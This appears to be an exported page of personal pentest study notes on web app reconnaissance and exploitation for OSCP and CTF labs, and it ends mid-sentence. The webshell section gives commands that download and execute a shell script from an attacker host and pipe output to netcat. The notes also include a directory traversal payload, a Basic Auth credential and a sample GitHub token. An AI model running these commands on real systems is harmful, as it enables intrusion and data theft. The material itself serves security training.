<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>WebApp</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>WebApp</h1><br/><p><h1>Resources</h1></p><p>Resources for various <a href="https://github.com/j0bin/Pentest-Resources/tree/master/Enumeration/Resources">Web Technologies</a></p><p></p><p><h1>Methodology</h1><ul><li><h1>• </h1>• Server Footprint: SW &amp; ver with <em>nmap -A</em></li></ul></p><p><ul><li>Programming <span style="color:#ff0000;">Language Version</span></li></ul></p><p><ul><li>Look for identifiable <a href="Recon_+_Services--WebApp_12.html#Domain Name">Domain Names</a><span style="color:#ff0000;"> referenced in source code</span> (i.e links). If none are found, try adding domain name to <strong>/etc/hosts</strong> <span style="color:#ff0000;">obtained from SMB</span>, for ex. See if you get <span style="color:#ff0000;">diff Resp w/ Domain Name vs IP</span>.</li></ul></p><p><ul><li><span style="color:#ff0000;">Research any Domain Names found</span>! Even if they aren&#39;t the WebApps DN, it could be the name of SW used (which may even be deprecated). For ex, nicepage.one refers to a <a href="Recon_+_Services--WebApp--Software--WordPress_24.html">WP</a> theme</li></ul></p><p><ul><li><a href="Recon_+_Services--WebApp_12.html#Subdir Enum">Subdir Enum</a> (w/ or w/o Domain Name, depending on if you get diff Resp using it). <span style="color:#ff0000;">Case-Sensitive </span>at first then test.</li></ul></p><p><ul><li><a href="Recon_+_Services--WebApp_12.html#Subdom Enum">Subdom Enum</a></li></ul></p><p><ul><li><a href="Recon_+_Services--WebApp_12.html#Fingerprint">Fingerprint SW</a>.  For ex, <em>whatweb -a 3 -v http://site.com</em> (Option for login creds, etc)</li></ul></p><p><ul><li>Developer Tools- <span style="color:#3584e4;text-decoration:underline;">Console</span>: Errors, <span style="color:#3584e4;text-decoration:underline;">Storage</span>: Cookies with encoded values, <span style="color:#3584e4;text-decoration:underline;">Inspector</span>: Dynamic data shows up here, not in “View Page Source”, <span style="color:#3584e4;text-decoration:underline;">Network</span>: Resources being fetched behind the scenes, <span style="color:#3584e4;text-decoration:underline;">Debugger</span>: Organize/Search through JS</li></ul></p><p><ul><li>Test every source for user input (<a href="Recon_+_Services--WebApp--Attack_Vectors_65.html#sinks">sinks</a>). For ex, URL params, Body Data params, HTTP Headers (e.g User Agent, X-Forwarded-For)</li></ul></p><p><ul><li>If WebApp SW is less familiar (e.g ritecms or another template), look up its <strong><a href="Recon_+_Services--WebApp_12.html#Analyzing Source Code">file structure</a></strong>. <span style="color:#ff0000;">Could have a Github, official site</span>, etc, that <span style="color:#ff0000;">lists subdirs</span> or has other useful info. TARGET SITE MAY HAVE DIFF WEBROOT (e.g hosted out of <strong>/cms/</strong>)</li></ul></p><p><ul><li>Look for ways to <span style="color:#ff0000;">trigger a lookup of your SMB server</span> to <a href="Misc_Attacks--Network_Attacks_14.html#capture ntlm">capture an NTLMv2 hash</a> (e.g <span style="color:#ff0000;">form field asking for a website URL</span>, <span style="color:#ff0000;">file upload</span>, <span style="color:#ff0000;">RFI</span>, etc)</li></ul></p><p><ul><li>Edit Requests to <span style="color:#ff0000;">delete expected parameters</span>. This can trigger helpful error messages.</li></ul></p><p><h1></h1></p><p><h1></h1><a name="Fingerprint"></a><span style="color:#ffbe6f;">Fingerprint SW</span></p><p>May get diff results depending on endpoint used, so try new subdir&#39;s if it seems new technology is being used.</p><p>Take research the name of the <span style="color:#ff0000;">website&#39;s Title</span>.</p><p></p><p><em>whatweb -a 3 -v</em> http://192.168.249.143:81<em> | tee loot/whatweb_81</em></p><p></p><p><h2>HTTP Basic Auth</h2><h1></h1></p><p><h1></h1>The --user parameter didn&#39;t work for me. Auth using your browser, copy the Header, &amp; paste it into the command like-</p><p></p><p><em>-H &#39;Authorization: Basic c2t5bGFyazpVc2VyK2RjR3Zmd1RialZbXQ==&#39;</em>			Should show Status Code 200 if successful</p><p></p><p><h2>Vulnerable Language Version</h2></p><p>Even if Web App is up to date, the version of the programming language used could be vulnerable.</p><p></p><p>Sometimes these exploits only work if a certain OS (e.g. Windows) or server is in use.</p><p></p><p><h3>PHP Windows Remote Code Execution (Unauthenticated)</h3></p><p>Version: PHP 8.3,* &lt; 8.3.8,  8.2.*&lt;8.2.20, 8.1.*, 8.1.29</p><p></p><p><a href="https://www.exploit-db.com/exploits/52047">CVE-2024-4577</a> (Haven&#39;t tested it)</p><p></p><p><h1>Browser DevTools</h1></p><p>[Wreath 9-11]</p><p><h2>Console</h2></p><p>May show relevant information, namely <span style="color:#ff0000;">JavaScript Errors</span>. The output in Console can show:</p><p></p><p>What SW is being used (&amp; what may not be working properly), File paths?, etc</p><p></p><p><h2>Inspector</h2></p><p>View the Source Code for a webpage, <span style="color:#ff0000;">INCLUDING</span> the <span style="color:#ff0000;">dynamically loaded content</span>!</p><p></p><p><strong>Right Click</strong> → <strong>View Source</strong> only shows statically loaded content, so it can miss things in specific scenarios (e.g. Some types of XSS Payloads)</p><p></p><p><h2>Network</h2></p><p>Shows all resources that the webpage Requested while loading, even those <span style="color:#ff0000;">missed by Burp</span>.</p><p></p><p>Tools like <span style="color:#ff0000;">Burp may not show the result of a payload</span>, even <span style="color:#ff0000;">when this DevTool can</span> (e.g. the Dir Trav Example shown below, from PortSwigger lab).</p><p></p><p>Any of these requests may contain a vector for exploitation .</p><p></p><p><h3>Example Uses</h3></p><p>Any normal Attack vector could apply, these are just a couple.</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Directory Traversal</span>: The page loads images using a vulnerable URL. <strong>Edit &amp; Resend</strong> the Request to contain a payload.</p><p></p><p><strong>/image?filename=dog.jpg</strong><em></em></p><p><em></em><em></em></p><p><em></em><strong>/image?filename=/var/www/images/../../../etc/password</strong></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">XXE</span>: You may get a XML data that can be used to contruct an XXE Payload</p><p></p><p><h2>Debugger</h2></p><p></p><p><h1></h1></p><p><h1></h1><a name="Analyzing Source Code"></a><span style="color:#ffbe6f;">Analyzing Source Code</span></p><p>Look for anything potentially identifiable to find the SW used (could be missed by <em>whatweb</em>). This can  be used to research vulns, or find repos for more info about subdirs, etc.</p><p>For ex, a <span style="color:#ff0000;">website&#39;s Title</span> may actually be the <span style="color:#ff0000;">name of SW</span></p><p></p><p>{whatweb}<strong> Title     : Attendance and Payroll System</strong>		| In source code it&#39;s between &lt;title&gt; tags</p><p></p><p>Any <span style="color:#ff0000;">odd names</span> (e.g <span style="color:#ff0000;">example usernames</span> like “nurhodelta”) can be researched to find the repo that Source file comes from!</p><p></p><p>May need to examine multiple files (even across diff Repos) to get full picture. These files may not even explicitly reference each other by name!</p><p></p><p><h2>FOSS Repos</h2></p><p>Check Github, the official site, etc, for file structure (subdirs &amp; other useful info).</p><p></p><p>In Github, <span style="color:#ff0000;">check out the Developer&#39;s profile page</span>, bc there <span style="color:#ff0000;">some of target&#39;s code may be from a diff Repo</span>! (e.g site uses <strong>/OSTicket</strong> &amp; <strong>/OSTicket-plugin</strong> Repos).</p><p></p><p>The target site may have a diff webroot (e.g this repo is being hosted out of <strong>/cms/</strong>) &amp; site could have a file missing / edited. Look for known file names to confirm.</p><p></p><p><h3>Company Github</h3></p><p>[CTF2 106]</p><p>Even if the source code isn&#39;t available for a company&#39;s <a href="OSInt_62.html#Github">Github Account</a>, you could find other userful info, like users under the <strong>People</strong> tab.</p><p></p><p><h2>Less Popular Files</h2></p><p>Remember to check secondary files. They often don&#39;t have anything useful, but sometimes contain valuable information!</p><p></p><p><h3>.js</h3></p><p>Can help with fingerprinting SW &amp; Versions. May contain <span style="color:#ff0000;">links to other subdirectories</span> or <span style="color:#ff0000;">subdomains</span>.</p><p></p><p>The JS code can also help you find a gadget for XSS, reveal site functionality, etc.</p><p></p><p><h3>.css</h3></p><p>Very uncommonly contains anything useful, but it occasionally does.</p><p></p><p>Note to self: Read up CSS Injection</p><p></p><p><h2>Output Source Code</h2></p><p>Convert html to a more user friendly output with <em>html2markdown</em>.</p><p></p><p><em>curl -s http://192.168.152.140:8000 | html2markdown</em></p><p></p><p><h1>User Agent Spoofing</h1></p><p><span style="color:#ff0000;">CLi tools often use an abnormal UA</span>, which differentiates their traffic from a browser&#39;s. This is less stealthy, but can sometimes also interfere with test results.</p><p></p><p>Web <span style="color:#ff0000;">traffic may be handled differently depending on the UA provided</span>. You can typically manually specify the value for this header. For example-</p><p></p><p><em>ffuf -c -u &quot;http://10.10.175.187/FUZZ&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -H &quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&quot; </em></p><p><h1></h1></p><p><h1></h1><a name="Subdir Enum"></a><span style="color:#ffbe6f;">Subdir Enum</span><ul><li>After finding a subdir, try <span style="color:#ff0000;">cHaNgING the case</span> to see if it still resolves. </li></ul></p><p><ul><li>If you can&#39;t find any subdirs try using <span style="color:#ff0000;">wordlists that contain diff case subdirs</span>.</li></ul></p><p><ul><li>Check for an <a href="Recon_+_Services--WebApp--API_42.html">API</a>. You may get 404s unless you hit the EXACT full URI to an endpoint (e.g. <strong>/api/</strong> gives 404, but <strong>/api/upload </strong>works).</li></ul></p><p><ul><li>Start with generic wordlist, then try more specific lists based off of server SW &amp; languages used. For ex, if you see nginx, <span style="color:#ff0000;">fuzz each subdir for common </span><a href="file:///usr/share/wordlists/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt">PHP filenames</a></li></ul></p><p></p><p>★<span style="color:#ff0000;">ALWAYS use &gt;1 worlist!</span> For ex, <strong>raft</strong> is large, but may miss things caught by <strong>common.txt</strong></p><p></p><p>★<span style="color:#ff0000;">ALWAYS </span>specify <span style="color:#ff0000;">extensions</span>. Many wordlists don&#39;t use them by default (e.g <strong>.txt</strong>,<strong>.bak</strong>,<strong>.html</strong>). Use ext for Webapp&#39;s languages. If an ext is blacklisted in <strong>/robots.txt</strong>, use it!</p><p><ul><li>Add extensions to content from wordlist (e.g for ffuf <strong>-e .php,.pl </strong>{Unlike other tools, need to add <strong>.</strong> for ffuf}<strong> </strong>(Some wordlists already incl ext)</li></ul></p><p><ul><li>Look for Github or official site for SW used. May contain subdir layout</li></ul></p><p><ul><li><span style="color:#ff0000;">Even if the homepage</span> (or any parent dir) <span style="color:#ff0000;">is </span><strong><span style="color:#ff0000;">403 Forbidden</span></strong>, that <span style="color:#ff0000;">doesn&#39;t mean the same is true for all of the subdirs</span>!</li></ul></p><p><ul><li>Look for <strong>/.well-known/</strong> &amp; <strong>/.well-known/security.txt</strong>. This isn&#39;t “Well Known” for Seclists wordlists!</li></ul></p><p><ul><li>Even if you are auto-redirected to a directory (e.g <strong>/</strong> → <strong>/en/</strong>), start by fuzzing the parent directory</li></ul></p><p><ul><li>Try fuzzing <strong><span style="color:#ff0000;">/#/</span></strong>. Not included in many wordlists. May be ignored by<strong> ffuf -ic</strong> (ignore comment) arg.</li></ul></p><p></p><p><h2>Find Hidden Requests with Burp</h2></p><p>[CTF B 91 &amp; 176]</p><p></p><p>Some traffic isn&#39;t visible to users &amp; won&#39;t show up in the Networking DevTool. Run all traffic through burpsuite.</p><p></p><p><span style="color:#f66151;text-decoration:underline;">IMPORTANT</span>: burp <span style="color:#ff0000;">may not even show these Req&#39;s in the </span><strong><span style="color:#ff0000;">sitemap</span></strong> or the <span style="color:#ff0000;">proxy&#39;s </span><strong><span style="color:#ff0000;">History</span></strong>. It usually will, but most reliable option is to use <strong>Intercepter</strong>.</p><p></p><p><h3>Setting Scope</h3></p><p>These Requests may be going to a different subdomain (or even another server!), so ensure burpsuite&#39;s scope isn&#39;t too restrictive.</p><p></p><p>Assign the server&#39;s IP a hostname &amp; <span style="color:#ff0000;">use the hostname for the scope</span> with <strong><span style="color:#ff0000;">Include Subdomains</span></strong> enabled. <span style="color:#ff0000;">Don&#39;t specify a protocol or port</span>. Repeat for all hosts in scope.</p><p></p><p><h3>Finding Request</h3></p><p>If it&#39;s not in sitemap or the proxy&#39;s History, enable <strong>Intercept</strong> &amp; manually forward Req&#39;s (optionally enable <strong>Show Response</strong>)</p><p></p><p><h2>Bypass Redirection</h2></p><p>If redir away from subdir, but it has a diff wordcount in <strong>ffuf</strong>, this indicated you may be able to send traffic to that endpoint using <strong>burp</strong>! Can also view rendered content with burp.</p><p><h1></h1></p><p><h1></h1><h2>Protected by HTTP Basic Auth</h2></p><p>May still be able to do subdir enum! If a subdir exists, it <span style="color:#ff0000;">may show up as Status 401</span> letting you know it exists &amp; giving insight into the website (e.g Uploads dir shows that it may take uploads from another machine or SVC, or have the ability to upload itself).</p><p></p><p>May also be able to <span style="color:#ff0000;">view (some) of these webpages w/o Auth even if they&#39;re 401! </span>ffuf will show you a diff <strong>Size</strong>, indicating that you can Nav to that pg, hit <strong>Cancel</strong> instead of Authenticating, &amp; then view the contents of that page!</p><p></p><p><h3>Using HTTP Basic Auth</h3></p><p>Instead of a cookie, it has its own header like- <strong>Authorization: Basic</strong> B64</p><p></p><p><strong>Authorization: Basic</strong> c2t5bGFyazpVc2VyK2RjR3Zmd1RialZbXQ==</p><p></p><p><h2>Fuzzing through a Proxy (ffuf)</h2><h1></h1></p><p><h1></h1>The arg -<strong>-replay-proxy</strong>, just replays results through a proxy (i.e burp), but can instead use <strong>-x</strong> to use specify a proxy that&#39;ll be used to connect to the target <a href="Recon_+_Services--WebApp_12.html">WebApp</a>.</p><p></p><p>For example, if you configured <a href="Recon_+_Services--WebApp_12.html#burp upstream proxy">Burp&#39;s Upstream Proxy</a>, you can use<strong> -x http://localhost:8080</strong>. This will cause ffuf to connect to burp, which in turn will connect to the upstream proxy, &amp; that will be used to reach target site.<h1></h1></p><p><h1></h1><h1></h1></p><p><h1></h1><h1>Webshells</h1><h1></h1></p><p><h1></h1>Try with &amp; without <span style="color:#ff0000;">URL-Encoding</span></p><p></p><p>Try multiple diff <span style="color:#ff0000;">payloads based off the WebApp&#39;s SW</span> (e.g PHP for Apache target, whether host is Linux or Windows) &amp; host OS (e.g. a PHP payload that executes /bin/bash won&#39;t work on Windows).</p><p></p><p>For example, 1 ASPX Payload may fail on a specific host but a diff one works (e.g. Msfvenom).</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: If a payload causes a behavior change (e.g. the page hangs like it&#39;s trying to execute a shell) this could indicate that your syntax works. Retry with a different port for your reverse shell. </p><p></p><p><h2>Uploading Webshell</h2></p><p>You can upload a Webshell using <strong>SMB</strong>, <strong>FTP</strong>, Web App functionality, etc.</p><p></p><p>You <span style="color:#ff0000;">MUST use the proper file extension</span> for the Web App to properly interpret the code (e.g. shell.php for Apache).</p><p></p><p><h2>Uploading File via Webshell</h2></p><p>Payloads often work better if you use RCE to upload the Reverse Shell Payload &amp; execute it, as opposed to directly running the Reverse Shell payload from the Web App. For example,</p><p></p><p><em>curl http://ATKER/shell.sh -o /tmp/shell.sh; chmod 777 /tmp/shell.sh; /tmp/shell.sh</em></p><p></p><p><h3>Run in RAM</h3></p><p>Can also try uploading payload to RAM &amp; running it from there.</p><p></p><p><em>curl http://10.2.11.116/shell.sh | bash</em></p><p></p><p><em>wget http://10.2.11.116/linpeas.sh -O - | sh | nc 10.2.11.116 9999</em></p><p></p><p><h3>Tips</h3></p><p><span style="color:#8ff0a4;text-decoration:underline;">Uploading</span>: You may need to use an alternate method for uploading the file, like another service (e.g. FTP, SMB, etc), another tool (e.g. wget, iwr {Windows}, etc), or the Web App&#39;s built-in functionality.</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Omit Protocol</span>: Tools like curl &amp; wget allow you to omit the URL Protocol if you are serving the file from an HTTP server on port 80 (e.g. wget ATKER/shell.sh)</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Seperating Commands</span>: Try different command seperators (e.g. <strong>;</strong>, <strong>&amp;&amp;</strong>, or <strong>&amp; </strong>{CMD}). If those don&#39;t work, try running the commands 1 at a time.</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Spaces</span>: You can use <strong>${IFS}</strong> instead of spaces for a Linux host.</p><p></p><p><h2>Troubleshooting</h2></p><p><h3>Architecture</h3></p><p>Ensure payload is using the proper architecture (i.e If using msfvenom. The payloads in<strong> /usr/share/webshells/</strong> seem to usually work regardless).</p><p></p><p>x64 (64-bit) machines typically can also run x86 (32-bit) programs for backwards compatibility, so it&#39;s <span style="color:#ff0000;">often safest to use an x86 payload if unsure</span>.</p><p></p><p>★HOWEVER, <span style="color:#ff0000;">some x64 machines</span> seem to <span style="color:#ff0000;">only respond to x64 payloads</span>!</p><p></p><p><h3>Using Domain Names</h3></p><p>The correct <span style="color:#ff0000;">Domain Name may be required to upload</span> a webshell <span style="color:#ff0000;">&amp;/or to resolve</span> the page containing that webshell!</p><p></p><p>The Domain Name may not be obvious. This name may be found in-</p><p><ul><li><span style="color:#ff0000;">Email</span> addresses (e.g <strong>security@skylark.jp</strong> hints toward skylark.jp Domain!)</li></ul></p><p><ul><li>Source Code (e.g links in the HTML)</li></ul></p><p> <ul><li>Queried via <span style="color:#ff0000;">DNS</span></li></ul></p><p><ul><li>Found in <span style="color:#ff0000;">Certificates</span> (e.g <a href="Recon_+_Services_4.html#TLS/SSL Certificates">TLS/SSL cert</a> for HTTPS or RDP). This will likely be found by nmap.</li></ul></p><p><ul><li>Referenced by other services (e.g SMB using tool like enum4linux-ng)</li></ul></p><p></p><p><h3>Host has Limited Binaries</h3></p><p>You may be unable to execute certain Reverse Shell payloads because the target is lacking the binaries needed to do so.</p><p></p><p>In this case, you can try uploading a statically compiled <a href="PrivEsc--Linux--Post-Exploit_47.html#BusyBox">busybox</a> (at least on Linux) &amp; using that to execute a netcat Reverse Shell.</p><p></p><p><h3>PHP</h3></p><p>If RCE isn&#39;t working on a PHP Server, try just executing <strong>phpinfo()</strong> by itself. Among other things, it will tell you if the Web App is blocking certain functions (e.g.<strong> system()</strong> ).</p><p></p><p><h3>Can&#39;t Connect to HTTP Server</h3></p><p>If you are trying to have the target download a file from your HTTP Server, but it isn&#39;t working, try omitting the protocol when executing <strong>wget</strong> or <strong>curl</strong>.</p><p></p><p>You HTTP Server should be <span style="color:#ff0000;">running on port 80</span>.</p><p></p><p><em>wget ATTAKER/payload.sh</em></p><p></p><p></p><p><h3>Prompt-Based Backdoor</h3></p><p>Some backdoors give you the ability to execute cmds (i.e <strong>simple-backdoor.php</strong>), while others just trigger R shell when the pg is loaded. For those that give arbitrary RCE-</p><p></p><p>Base the cmd executed off of the underlying host&#39;s OS. For ex, <strong>simple-backdoor.php</strong> works for any host running Apache, but the R shell payload needs to be OS specific.</p><p></p><p>May need to URL-Encode payload? (May just automatically happen when cmd is entered into URL)</p><p><h1></h1></p><p><h1></h1></p><p><a name="Github Public Repo"></a><h1>Github Public Repo</h1></p><p>[Wreath 132-134 &amp; CTF B 67]</p><p></p><p><h2>Dumper</h2></p><p><span style="color:#ff0000;">Use git-dumper</span>. It was able to retrieve more data than GitTools (may be situations where that&#39;s not the case? Doesn&#39;t hurt to try both?)</p><p></p><p><h3>git-dumper</h3><h3></h3></p><p><h3></h3>Create a destination dir first. <a href="https://github.com/arthaud/git-dumper">git-dumper</a> will save <strong>.git/</strong> (viewable with l<em>s -a</em>) &amp; I think it also tries to reconstruct the data like GitTools Extractor does?</p><p></p><p>Re-run <strong>git-dumper</strong> if it times out. There are arguments to increase timeout values &amp; number of retries. </p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: Works even if dir listing isn&#39;t enabled on WebApp&#39;s<strong> .git/ </strong>directory!</p><p></p><p><em>git-dumper http://TARGET/.git ~/Documents/practice/crystal.144/loot/site</em></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Examine</span>: Can now do <span style="color:#ff0000;">Local Github repo enum</span> methods &amp; examine the attempted reconstruction (Should be the same as the GitTools Extractor?)<h3></h3></p><p><h3></h3><h3></h3></p><p><h3>GitTools</h3></p><p>Saves to specified path in <strong>.git/</strong>, so you&#39;ll need <em>ls -a</em> to view.</p><p></p><p><em>~/git/GitTools/Dumper/gitdumper.sh http://TARGET/.git/ /dest-dir</em></p><p></p><p><h2>Local Analysis</h2></p><p>In addition to using “Extractor” tool, you can also perform normal <a href="PrivEsc--Linux_29.html#github">queries against this dir</a> as if it was on the target&#39;s machine.</p><p></p><p><h2>Extractor</h2></p><p>May not completely recover the .git repository, especially if the repository has been compressed into “pack” files, but can reveal otherwise hidden info.</p><p></p><p>Specify the parent to the <strong>.git/</strong> dir &amp; where you want to extract the files to (it&#39;ll create the specified dir. For ex, repo)</p><p> </p><p><em>./extractor.sh ~/Documents/practice/crystal.144/loot ~/Documents/practice/crystal.144/loot/repo</em></p><p></p><p><h2>Cloning Private Remote Repo (&quot;Remotes&quot;)</h2></p><p>Def name for remotes is <a href="https://docs.github.com/en/get-started/getting-started-with-git/about-remote-repositories">origin</a>. Depending on config, may be able to clone via normal HTTPS url, via SSH (e.g using keys), or potentially a private FTP server.</p><p></p><p><h3>Using Access Token</h3></p><p>Can be used instead of a password. Starts with <strong>ghp_</strong>. For ex, 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</p><p></p><p><a name="Domain Name"></a><h1>Domain Names</h1><ul><li>Try using <span style="color:#33d17a;">IP</span>, <span style="color:#33d17a;">arbitrary Domain Name</span>, &amp;<span style="color:#33d17a;"> legit Domain Name </span>(if one is found). Some Web Apps will return different content. For ex, may get an<span style="color:#ff0000;"> error pg with relevant info if using arbitrary DN</span>, or may <span style="color:#ff0000;">only get WP site when using correct DN</span>. </li></ul></p><p><ul><li><span style="color:#ff0000;">After pwning host, check for Domain Names</span> in DNS records &amp; hosts file (<strong>/etc/hosts </strong>or<strong> C:\Windows\System32\Drivers\etc\hosts</strong>). Attempt Reverse DNS Lookup.</li></ul></p><p></p><p>•Domain Names may be visible in <span style="color:#ff0000;">Source Code</span>. An indicator could be broken links (e.g images that don&#39;t render. This may appear in DevTools Network tab).</p><p><ul><li>Don&#39;t need to add port to <strong>/etc/hosts</strong>, only add IP</li></ul></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: May be able to find hostname in a Cert picked up by Nmap (i.e for RDP or HTTPS site). For ex-</p><p></p><p><strong>ssl-cert: Subject: commonName=MS01.oscp.exam</strong></p><p></p><p>added to /etc/hosts- <strong>IP oscp.exam MS01.oscp.exam</strong></p><p></p><p><h2>Adding Subdomain to hosts</h2></p><p>Must<span style="color:#ff0000;"> 1st add a domain name</span>! If there&#39;s the subdomdomain <strong>MS01.oscp.exam</strong>, must use the following syntax for <strong>/etc/hosts</strong>.</p><p></p><p><strong>IP oscp.exam MS01.oscp.exam</strong></p><p></p><p><a name="Subdom Enum"></a><h2>Subdom Enum</h2></p><p>May/may not be relevant for OSCP. IRL do passive Subdom Enum as well.</p><p></p><p><h3>Configuration Files</h3></p><p>If you can access a Web App&#39;s config files, you may find a list of subdomains. This could be done via Directory Traversal / LFI or as part of your Post Exploitation after you have local access to the target.</p><p></p><p> For example, <a href="Recon_+_Services--WebApp--Software--Nginx_81.html#Interesting Files">Nginx</a> has a file that lists subdomains. Subdomains may be referenced in <strong>access.log</strong> or <strong>error.log</strong>.</p><p></p><p><strong>/etc/hosts</strong> also typically lists subdomains.</p><p></p><p><h3>Fuzzing </h3><h2></h2></p><p><h2></h2>Use <span style="color:#ff0000;">&gt;1 wordlists</span>, starting with shorter ones to catch any low hanging fruit.</p><p></p><p>Wildcard DNS resolution will cause all failures to redir to a legit pg. This means you often need to apply a filter to remove these results (e.g if normal domain returns results with 3499 words...)</p><p></p><p><em>ffuf -c -u &quot;http://aero.com&quot; -w /usr/share/wordlists/seclists/Discovery/DNS/shubs-subdomains.txt -H &quot;Host: FUZZ.aero.com&quot; -fw 3499</em><em></em></p><p><em></em><h2></h2></p><p><h2></h2><span style="color:#060f94;">★</span><h3>DNS Enumeration</h3><h3></h3></p><p><h3></h3><a href="Recon_+_Services--DNS_60.html">Enumerate DNS</a> regularly &amp; attempt Zone Transfer (axfr).</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Requirements: </span>Target needs to have some form of Name Resoultion that can be queried, so you to use a tool like <em>dig</em>. For ex-</p><p><ol><li>Connected to internet for External DNS (Not on OSCP)</li></ol></p><p><ol><li>Machine on its Net has port 53 open for internal DNS (does target also need 53 open if another host handles DNS?). Send query to whichever host has port 53 open</li></ol></p><p><ol><li>Host uses an alt method for Name Resolution (i.e NetBIOS for Windows, port 139 by def)</li></ol></p><p></p><p><h1>Vulnerability Scanning</h1></p><p>nikto &amp; Nmap NSE allowed on OSCP. Lots of false positives &amp; false negatives, so these tools are rarely worth running.</p><p></p><p>Outside of the OSCP, Nessus is a much better alternative.</p><p></p><p><a name="Nikto"></a><h2>Nikto</h2></p><p>An advantage to Nikto is that it can <span style="color:#ff0000;">discover subdirectories</span> while trying to scan for vulns.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: Should you use<strong> -vhost</strong> for subdomains?</p><p></p><p><em>nikto -nossl -host http://0day.thm</em></p><p> <h1></h1></p><p><h1>Password Attacks</h1><h1></h1></p><p><h1></h1><a href="Misc_Attacks--Password_Attack_5.html#WebApp Brute Force">Brute Force</a><h1></h1></p><p><h1></h1><h1></h1></p><p><h1></h1><a name="XSS"></a>XSS</p><p>Payloads can be delivered through a <a href="Recon_+_Services--WebApp_12.html#Upload XSS CSRF">File Upload</a>, a form field, a URL parameter, or any other place that accepts user input (HTTP Headers?). See <a href="Defenses_+_Bypasses--Mitigations_91.html#XSS">Defenses &amp; Bypasses</a> for more info.</p><p></p><p><h2>Cookie Thief</h2></p><p>[CTF 164-168]</p><p>If DevTools shows that Cookies have <strong>HTTPONLY false</strong>, you can interact with them via JS, making them attack vectors for XSS.</p><p>Stealing a cookie lets you login as that user, &amp; you don&#39;t even need to know their username!</p><p></p><p><span style="color:#060f94;text-decoration:underline;">CTF Tip</span>: If you see that Cookies have <strong>HTTPONLY false</strong>, this may be a hint that there are bots who&#39;ll trigger your XSS payload (or it&#39;s just a misdirect).</p><p><h1></h1></p><p><h1>Foreign Languages</h1></p><p>Try to <span style="color:#ff0000;">ID the langauge</span>, like by pasting text into <span style="color:#ff0000;">Google Translate</span>. There&#39;s a chance you can <span style="color:#ff0000;">access the translated subdirectory to get an English mirror</span> (e.g translated to demo, so nav to<strong> /demo</strong>).</p><p></p><p><h2>Firefox Auto Translation</h2></p><p>Firefox may fail to automatically detect the language, causing it to say “Translation not available. We don&#39;t support this language...”.</p><p></p><p>You still may be able to translate it by manually selecting the target language after using Google Translate to ID it.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: Firefox will probably only translate parts of the page (&amp; only on some pages). You may be able to change the language setting, but doing so isn&#39;t very stealthy.</p><p></p><p>Hamburger Icon (3 lines at top Right of screen) ↓ <strong>Translate Page</strong> → <strong>Change Source Language</strong></p><p></p><p><h2>Enumeration</h2></p><p>If a site is built using another language, the subdirs &amp; subdoms, in addition to the page content, may also be in that language. This makes fuzzing more difficult.</p><p></p><p>Depending on the context, these characters may be represented via URL or HTML Encoding. These characters will still render out to the correct destination.</p><p></p><p>For example, German mainly uses the same alphabet, but languages like Japanese are more likely to be represented with some form of encoding.</p><p></p><p>Translate the characters using an online decoder, &amp; pass them to tools using URL Encoding.</p><p></p><p>Still should <span style="color:#ff0000;">run normal wordlists</span>! For ex, site may still have english <strong>.git/</strong> (Autorecon also seems to have been able to detect foreign subdirs with feroxbuster)</p><p></p><p><h3>Potential Workarounds</h3><ol><li> Try using the English translation of a known subdirectory. If it works, you may be able to proceed with a normal wordlist (but it still may miss things!).</li></ol></p><p><ol><li> Use wordlists in that language (Most likely to be accurate)</li></ol></p><p><ol><li>Dynamically build wordlists (i.e <em>cewl --with-numbers -e </em>http://TARGET). Findings can be used to fuzz subdirs for you to use <em>cewl</em> on, &amp; you&#39;ll repeat the cycle.</li></ol></p><p><ol><li>Use <strong>View Source</strong> to find embedded links. Highly likely to miss subdirs!</li></ol></p><p><ol><li>Try translating existing wordlists</li></ol></p><p></p><p><h1>Powershell Web Access</h1></p><p><a href="https://powershellisfun.com/2023/09/14/using-windows-powershell-web-access/">Web interface</a> for Powershell. A <span style="color:#ff0000;">user can access this even if they don&#39;t have WinRM</span> <span style="color:#ff0000;">privileges</span> (etc).</p><p></p><p>Can be located in any subdir, but a common location is <strong>/pswa </strong>(<span style="color:#ff0000;">not in raft wordlist by def</span>!)</p><p></p><p>Often requires HTTPS website.</p><p></p><p>Doesn&#39;t require additional ports to be open, traffic is routed through WebApp&#39;s port (e.g 443)</p><p></p><p><h2>Sign-in</h2></p><p><span style="color:#ff0000;">Can likely ignore the </span><strong><span style="color:#ff0000;">Optional Connection Settings</span></strong>, even if the def settings reference things like WinRM &amp; that wasn&#39;t discovered via Nmap scan.</p><p></p><p>For ex, computer name can be found via SMB &amp; can find full usernames via <a href="Recon_+_Services--SMB_11.html#IPC$ Enum">IPC$ Enum</a>.</p><p></p><p>Computer Name will likely be the same as what&#39;s used in the username, unless it&#39;s a Domain Account.</p><p></p><p>Username: <strong>oscp\bob</strong></p><p>Connection Type: <strong>Computer Name</strong>		(left as default)</p><p>Computer name: <strong>oscp</strong></p><p></p><p><h3>Determine Valid Usernames</h3><span style="color:#237522;"></span></p><p><span style="color:#237522;"></span>Using invalid user seems to get <strong>An unexpected error</strong>, but valid user like “bob” just tells you sign in failed.</p><p></p><p>If you don&#39;t know usernames, this may be a way to determine which Accts exist.</p><p></p><p><a name="WAF Bypasses"></a><h1>WAF Bypasses</h1></p><p>May need to combine multiple of the following methods.</p><p></p><p><h2>Recon</h2></p><p>Determine what&#39;s installed on target &amp; what strings are blocked. Test<span style="color:#ff0000;"> 1 word at a 